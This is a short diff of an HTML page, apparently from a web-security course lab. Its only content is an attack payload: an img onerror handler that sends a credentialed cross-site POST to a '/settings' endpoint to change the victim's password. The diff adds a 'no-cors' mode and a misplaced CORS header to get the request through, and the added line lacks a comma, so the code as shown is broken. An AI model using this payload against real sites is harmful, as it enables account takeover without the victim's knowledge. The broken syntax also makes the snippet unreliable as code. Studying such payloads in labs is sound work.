@@ -6,8 +6,9 @@
 <p>My first paragraph.</p>
 <img src="1" onerror="fetch('https://cats.is-course.ru/settings', {
   method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  headers: {'Content-Type': 'application/x-www-form-urlencoded', 'Access-Control-Allow-Origin': '*'},
   credentials: 'include',
+  mode: 'no-cors'
   body: 'password=LupaLupaLupa1236%23&confirm-password=LupaLupaLupa1236%23'
 })">
   
